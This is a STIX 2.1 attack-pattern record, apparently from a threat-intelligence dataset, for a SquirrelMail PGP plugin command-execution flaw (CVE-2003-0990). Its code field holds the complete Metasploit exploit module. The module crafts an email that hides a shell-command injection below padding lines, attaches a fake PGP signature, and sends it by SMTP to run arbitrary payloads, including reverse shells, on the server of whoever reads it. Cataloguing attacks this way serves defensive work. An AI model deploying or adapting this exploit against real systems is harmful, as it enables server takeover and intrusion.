{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--17bf28c9-ac4d-4401-a5bd-23e053b721d7",
    "created": "2024-08-14T17:13:05.017684Z",
    "modified": "2024-08-14T17:13:05.017688Z",
    "name": "SquirrelMail PGP Plugin Command Execution (SMTP)",
    "description": " This module exploits a command execution vulnerability in the PGP plugin of SquirrelMail. This flaw was found while quickly grepping the code after release of some information at http://www.wslabi.com/. Later, iDefense published an advisory ....  Reading an email in SquirrelMail with the PGP plugin activated is enough to compromise the underlying server.  Only \"cmd/unix/generic\" payloads were tested.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/squirrelmail_pgp_plugin.rb",
            "external_id": "squirrelmail_pgp_plugin.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0990"
        },
        {
            "source_name": "reference",
            "url": "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=330"
        },
        {
            "source_name": "reference",
            "url": "http://www.wslabi.com/wabisabilabi/initPublishedBid.do?"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  #\n  # This module sends email messages via smtp\n  #\n  include Msf::Exploit::Remote::SMTPDeliver\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SquirrelMail PGP Plugin Command Execution (SMTP)',\n      'Description'    => %q{\n          This module exploits a command execution vulnerability in the\n        PGP plugin of SquirrelMail. This flaw was found while quickly\n        grepping the code after release of some information at\n        http://www.wslabi.com/. Later, iDefense published an advisory ....\n\n        Reading an email in SquirrelMail with the PGP plugin activated\n        is enough to compromise the underlying server.\n\n        Only \"cmd/unix/generic\" payloads were tested.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'Nicob <nicob[at]nicob.net>' ],\n      'References'     =>\n        [\n          ['CVE', '2003-0990'],\n          ['OSVDB', '3178'],\n          ['URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=330'],\n          ['URL', 'http://www.wslabi.com/wabisabilabi/initPublishedBid.do?'],\n        ],\n      'Stance'         => Msf::Exploit::Stance::Passive,\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'BadChars'    => '',\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd cmd_bash',\n              'RequiredCmd' => 'generic perl ruby python bash-tcp telnet',\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'SquirrelMail PGP plugin < 2.1', {} ],\n        ],\n      'DisclosureDate' => '2007-07-09',\n      'DefaultTarget' => 0))\n\n  end\n\n  def mime_defaults()\n    self.header.set(\"MIME-Version\", \"1.0\")\n    self.header.set(\"Content-Type\", \"multipart/signed; boundary=\\\"#{self.bound}\\\"; protocol=\\\"application/pgp-signature\\\"; micalg=pgp-sha1\")\n    self.header.set(\"Subject\", '') # placeholder\n    self.header.set(\"Date\", Time.now.strftime(\"%a,%e %b %Y %H:%M:%S %z\"))\n    self.header.set(\"Message-ID\",\n      \"<\"+\n      Rex::Text.rand_text_alphanumeric(rand(20)+40)+\n      \"@\"+\n      Rex::Text.rand_text_alpha(rand(20)+3)+\n      \">\"\n      )\n    self.header.set(\"From\", '')    # placeholder\n    self.header.set(\"To\", '')      # placeholder\n  end\n\n  def exploit\n\n    body =\n      # Display some junk\n      rand_text_alphanumeric(rand(128)+16) + \"\\n\" +\n      rand_text_alphanumeric(rand(128)+16) + \"\\n\" +\n      rand_text_alphanumeric(rand(128)+16) + \"\\n\" +\n      rand_text_alphanumeric(rand(128)+16) + \"\\n\" +\n      rand_text_alphanumeric(rand(128)+16) + \"\\n\" +\n      rand_text_alphanumeric(rand(128)+16) + \"\\n\" +\n\n      # Scroll down\n      \"\\n\" * (rand(100)+35) +\n\n      # Escape filter and insert payload\n      \"AAAA\\\\\\\";\" + payload.encoded + \";echo \\\\\\\"BBBBB\\n\"\n\n    sig =\n      \"-----BEGIN PGP SIGNATURE-----\\nVersion: GnuPG\\n\\n \" +\n      rand_text_alphanumeric(rand(20)+54) + \"\\n\" +\n      rand_text_alphanumeric(rand(20)+34) + \"\\n\" +\n      \"-----END PGP SIGNATURE-----\\n\"\n\n    msg = Rex::MIME::Message.new\n    msg.extend(MessageExtend)\n    msg.mime_defaults\n    msg.subject = datastore['SUBJECT'] || Rex::Text.rand_text_alpha(rand(32)+1)\n    msg.to = datastore['MAILTO']\n    msg.from = datastore['MAILFROM']\n\n    msg.add_part(body, \"text/plain;charset=us-ascii;format=flowed\", \"quoted-printable\", nil)\n    msg.add_part(sig, \"application/pgp-signature\", nil, \"attachment; filename=signature.asc\")\n\n    send_message(msg.to_s)\n\n    print_status(\"Waiting for a payload session (backgrounding)...\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-07-09",
    "x_mitre_platforms": [
        "unix'"
    ]
}